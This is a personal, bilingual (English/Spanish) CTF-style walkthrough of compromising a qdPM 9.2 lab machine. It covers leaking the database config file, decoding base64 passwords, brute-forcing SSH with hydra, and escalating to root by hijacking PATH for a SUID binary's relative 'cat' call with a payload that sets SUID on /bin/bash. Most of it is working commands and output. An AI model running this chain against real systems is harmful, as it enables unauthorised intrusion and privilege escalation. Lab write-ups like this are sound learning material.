19He have a funcitonality that creates three dirs at the same time (mkt)


### MKT ###
mkt () {
mkdir  {nmap,content,exploits}
}

nmap
exploits
content

Face de "reconocimiento"

The guy said when it was a ttl 64 the S0 is linux and windows 128 ttl
### WHICHSISTEM.PY ###
I have to get it. And add it to the $PATH variable 
/usr/bin/whichSystem.py

whichSystem.py 192.168.0.36 

cat -l ruby (it is beter, and cute) #ruby

#whatweb

whatweb http://192.168.0.38
Aplicates a search about the technologies that are behind of the website

```
http://192.168.0.38 [200 OK] Apache[2.4.48], Bootstrap, Cookies[qdPM8], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[192.168.0.38], JQuery[1.10.2], PasswordField[login[password]], Script[text/javascript], Title[qdPM | Login], X-UA-Compatible[IE=edge]
```
Antique versions of jquery and other things are vulnerable to #XSS-attack and #Prototype-polution
qdpm is vulnerable
[qdPM 9.2](http://qdpm.net/) vulnerable to password exposure
```
sudo searchsploit qdPM 9.2
[sudo] contraseña para cds: 
------------------------------ ---------------------------------
 Exploit Title                |  Path
------------------------------ ---------------------------------
qdPM 9.2 - Cross-site Request | php/webapps/50854.txt
qdPM 9.2 - Password Exposure  | php/webapps/50176.txt
```

searchsploit -x

```
 Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
 Date: 03/08/2021
 Exploit Author: Leon Trappett (thepcn3rd)
 Vendor Homepage: https://qdpm.net/
 Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
 Version: 9.2
 Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4

The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://< website >/core/config/databases.yml file and download.
~
~
```
http://192.168.100.49/core/config/databases.yml 
Password ...
```
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true
		
```

We logg in with 

cds@cds:~$ sudo mysql -uqdpmadmin -h 192.168.100.49 -p 
Enter password:  UcVQCMQk2STVeS6J
```
cds@cds:~$ sudo mysql -uqdpmadmin -h 192.168.100.49 -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.26 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

We have this users on the database

```
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
-------------------------------------------------------------
```

PASSWORDS ON BASE 64
```
+------+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
```


Now we apply base 64 -d to decode all the passwords ... and we use a script very cool to see it in a better way

```c
cds@cds:~$ for password in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $password | base64 -d; echo; done | tee passwords
suRJAdGwLp8dy3rF
7ZwV4qtg42cmUXGX
X7MQkP3W29fewHdC
DJceVy98W28Y7wLg
cqNnBWCByS2DuJSy

```
Tee passwords export the passowds in an archive

smith
lucas
travis
dexter
meyer

we have two archives os users another of passwords, using hydra...

hydra -L users -P passwords ssh://192.168.100.49

```
[22][ssh] host: 192.168.100.49   login: travis   password: DJceVy98W28Y7wLg
[22][ssh] host: 192.168.100.49   login: dexter   password: 7ZwV4qtg42cmUXGX
```
This two matches

ssh travis@192.168.100.49 


and then we log in as travis via ssh

```
travis@debian:~$ hostname -i
127.0.1.1
travis@debian:~$ whoami
travis
travis@debian:~$ 

```

export TERM=xterm

Now we are seeing if there are some archives with permisions 

dexter@debian:/home/dexter$ find \-perm -4000 -user root 2>/dev/null 


ON THE INITIAL FOLDER
```
travis@debian:/$ find \-perm -4000 -user root 2>/dev/null
./opt/get_access
./usr/bin/chfn
./usr/bin/umount
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/passwd
./usr/bin/newgrp
./usr/bin/su
./usr/bin/mount
./usr/bin/chsh
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

this is strange opt get acces
```
travis@debian:/$ ls -l ./opt/get_access 
-rwsr-xr-x 1 root root 16816 Sep 25  2021 ./opt/get_access
```

now we see what the  file do 

```
travis@debian:/$ file ./opt/get_access 
./opt/get_access: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=74c7b8e5b3380d2b5f65d753cc2586736299f21a, for GNU/Linux 3.2.0, not stripped
```

"binary compiled - binario compilado de linux"


THIS IS WHAT IT DOES
```
travis@debian:/$ ./opt/get_access 

  ############################
  ########     ICA     #######
  ### ACCESS TO THE SYSTEM ###
  ############################

  Server Information:
   - Firewall:  AIwall v9.5.2
   - OS:        Debian 11 "bullseye"
   - Network:   Local Secure Network 2 (LSN2) v 2.4.1

All services are disabled. Accessing to the system is allowed only within working hours.

travis@debian:/$ 

```
NOW WE TRY TO PUT A STRING

```
travis@debian:/$ strings ./opt/get_access 
/lib64/ld-linux-x86-64.so.2
setuid
socket
puts
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
cat /root/system.info
Could not create socket to access to the system.
All services are disabled. Accessing to the system is allowed only within working hours.
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
get_access.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
system@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
socket@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
travis@debian:/$ 
```
So this is what it does.. and uses a "cat /root/system.info", this is a comand to execute in the same binary

LA RUTA DE CAT ES USR/BIN/CAT... YO NO PUEDO ACCEDER A EL BINARIO ESTE SI QUIERO HACER EL COMANDO YO. EL MUCHACHO DICE QUE ACCEDEMOS DE FORMA RELATIVA, POR EL BINARIO ESTE.. SE PUEDE SECUESTRAR EL BINARIO YENDO A 

cd /tmp/
touch cat chmod +x cat
$PATH
export PATH=/tmp:$PATH ( agregamso una carpeta antes para revisar en el path.. desde tmp y no desde la que sigue que es /bin/usr/)

Y AHORA MODIFICAMOS EL CAT .. CON NANO

chmod u+s /bin/bash
PONEMOS QUE MODIFIQUE EL PRIVILEGIO SUID A LA BASH...

now we execute it 

```
travis@debian:/tmp$ /opt/get_access 
All services are disabled. Accessing to the system is allowed only within working hours.
```
HA ECHO UN SECUESTRO DEL BINARIO Y AHORA HAY PRIVILEGIOS PARA EJECUTAR LO QUE SEA CON BASH
```
travis@debian:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
travis@debian:/tmp$ 
```
bash -p (privileged means p)
```
travis@debian:/tmp$ bash -p
bash-5.1# 

```
and now we are root

```
chmod: changing permissions of '/bin/bash': Operation not permitted
bash-5.1# 
```
we need to change the PATH again and we can do the cat of the root flag